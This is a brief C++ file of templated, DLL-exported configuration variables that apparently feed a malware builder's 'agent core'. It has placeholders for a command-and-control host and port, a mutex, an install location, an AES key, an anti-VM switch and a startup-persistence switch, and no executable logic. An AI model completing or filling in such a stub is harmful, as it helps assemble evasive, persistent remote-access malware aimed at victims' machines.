#include <windows.h>

// Config Variables (Will be linked with agent core)
extern "C" {
    __declspec(dllexport) char SERVER_IP[64] = "{{HOST}}";
    __declspec(dllexport) int SERVER_PORT = {{PORT}};
    __declspec(dllexport) char MUTEX_NAME[64] = "{{MUTEX}}";
    __declspec(dllexport) char TARGET_FILE_NAME[64] = "{{FILE_NAME}}";
    __declspec(dllexport) char INSTALL_ENV[32] = "{{INSTALL_ENV}}";
    __declspec(dllexport) char AES_KEY[64] = "{{AES_KEY}}";
    __declspec(dllexport) int ENABLE_ANTI_VM = {{ANTI_VM}};
    __declspec(dllexport) int ENABLE_INSTALLATION = {{STARTUP}};
}
